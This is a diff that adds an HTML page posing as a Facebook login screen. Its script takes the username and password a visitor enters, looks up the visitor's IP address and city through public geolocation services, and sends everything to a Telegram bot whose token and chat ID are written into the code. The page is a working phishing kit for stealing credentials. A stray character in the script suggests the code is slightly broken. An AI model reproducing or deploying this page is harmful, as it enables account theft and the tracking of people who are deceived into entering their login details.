@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+        }
+        .login-container h2 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: calc(100% - 24px);
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password, .signup {
+            margin-top: 15px;
+        }
+        .forgot-password a, .signup a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password a:hover, .signup a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Facebook Login</h2>
+        <input type="text" id="username" placeholder="Email or Phone Number">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="sendToTelegram()">Log In</button>
+        <div class="forgot-password">
+            <a href="#">Forgotten password?</a>
+        </div>
+        <div class="signup">
+            <a href="#">Create New Account</a>
+        </div>
+    </div>
+
+    <script>
+        async function sendToTelegram() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                l
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+
+                
+                const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+                const geoData = await geoResponse.json();
+                const city = geoData.city || 'Unknown';
+
+                
+                const botToken = '7085151914:AAF08OGTwZWvxhLyTyK39bsV41YEERmijx0';
+                const chatId = '6752982813';
+                const message = `Username: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nCity: ${city}`;
+
+                
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                const response = await fetch(url);
+                if (response.ok) {
+                    alert('Login details, IP address, and city sent to Telegram!');
+                } else {
+                    alert('Failed to send message to Telegram');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred: ' + error.message);
+            }
+        }
+    </script>
+</body>
+</html>
